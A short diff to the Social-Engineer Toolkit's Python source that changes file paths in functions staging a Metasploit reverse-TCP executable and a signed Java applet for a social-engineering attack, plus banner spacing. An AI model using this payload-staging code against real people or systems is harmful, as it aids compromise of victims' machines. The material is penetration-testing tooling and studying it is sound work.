@@ -612,7 +612,7 @@ def meterpreter_reverse_tcp_exe(port):
     random_value = generate_random_string(5, 10)
     # copy the created executable to program_junk
     print_status("Executable created under src/program_junk/%s.exe" % (random_value))
-    subprocess.Popen("cp src/html/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait() 
+    subprocess.Popen("cp src/program_junk/msf.exe src/program_junk/%s.exe" % (random_value), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait() 
 #
 # Start a metasploit multi handler
 #
@@ -692,7 +692,7 @@ def java_applet_attack(website, port, directory):
     #if os.path.isfile("src/program_junk/rand_gen"):
 	  
 	# move the file to the specified directory and filename
-	subprocess.Popen("cp src/html/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+	subprocess.Popen("cp src/program_junk/msf.exe %s/%s" % (directory,filename), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
     # lastly we need to copy over the signed applet
     subprocess.Popen("cp src/program_junk/Signed_Update.jar %s" % (directory), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
@@ -844,7 +844,7 @@ def show_banner(define_version,graphic):
   [---]        The Social-Engineer Toolkit ("""+bcolors.YELLOW+"""SET"""+bcolors.BLUE+""")         [---]        
   [---]        Created by:""" + bcolors.RED+""" David Kennedy """+bcolors.BLUE+"""("""+bcolors.YELLOW+"""ReL1K"""+bcolors.BLUE+""")         [---]
   [---]                   Version: """+bcolors.RED+"""%s""" % (define_version) +bcolors.BLUE+"""                   [---]
-  [---]                Codename: '""" + bcolors.YELLOW + """Headshot""" + bcolors.BLUE + """'              [---]
+  [---]               Codename: '""" + bcolors.YELLOW + """Headshot""" + bcolors.BLUE + """'               [---]
   [---]         Follow us on Twitter: """ + bcolors.PURPLE+ """@trustedsec""" + bcolors.BLUE+"""        [---]
   [---]         Follow me on Twitter: """ + bcolors.PURPLE+ """@dave_rel1k""" + bcolors.BLUE+"""        [---]
   [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE+"""       [---]
